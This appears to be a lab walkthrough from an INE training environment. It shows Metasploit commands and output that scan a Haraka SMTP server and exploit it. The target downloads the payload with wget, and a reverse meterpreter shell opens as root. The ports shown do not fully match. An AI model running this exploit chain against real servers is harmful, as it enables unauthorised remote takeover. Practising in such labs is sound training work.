# Exploiting SMTP

```bash
# Start Metasploit
setg RHOSTS msf6 > setg RHOSTS 192.97.61.3
RHOSTS => 192.97.61.3
msf6 > setg RHOST 192.97.61.3
RHOST => 192.97.61.3

# Nmap
msf6 > db_nmap -sV -O 192.97.61.3
[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-24 10:10 IST
[*] Nmap: Nmap scan report for demo.ine.local (192.97.61.3)
[*] Nmap: Host is up (0.000069s latency).
[*] Nmap: Not shown: 999 closed tcp ports (reset)
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 25/tcp open  smtp    Haraka smtpd 2.8.8     <- Here
[*] Nmap: MAC Address: 02:42:C0:61:3D:03 (Unknown)
[*] Nmap: No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

msf6 > search type:exploit name:haraka
msf6 > use exploit/linux/smtp/haraka
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/smtp/haraka) >
msf6 exploit(linux/smtp/haraka) > set SRVPORT 9898
SRVPORT => 9898
msf6 exploit(linux/smtp/haraka) > set email_to root@attackdefense.test
email_to => root@attackdefense.test
msf6 exploit(linux/smtp/haraka) > set payload linux/x64/meterpreter_reverse_http
payload => linux/x64/meterpreter_reverse_http
msf6 exploit(linux/smtp/haraka) > set LHOST 192.97.61.2
LHOST => 192.97.61.2

# Ignore errors
msf6 exploit(linux/smtp/haraka) > run

[*] Started HTTP reverse handler on http://192.97.61.2:1234
[*] Exploiting...
[*] Using URL: http://192.97.61.2:9898/2Zk4a7V91
[*] Sending mail to target server...
[*] Client 192.97.61.3 (Wget/1.17.1 (linux-gnu)) requested /2Zk4a7V91
[*] Sending payload to 192.97.61.3 (Wget/1.17.1 (linux-gnu))
[!] http://192.97.61.2:1234 handling request from 192.97.61.3; (UUID: mad4ebkm) Without a database connected that payload UUID tracking will not work!


# Session created
msf6 exploit(linux/smtp/haraka) > sessions

Active sessions
===============

  Id  Name  Type                Information          Connection
  --  ----  ----                -----------          ----------
  1         meterpreter x64/li  root @ demo.ine.loc  192.97.61.2:8080 ->
            nux                 al                    192.97.61.3:49254
                                                     (192.97.61.3)
```
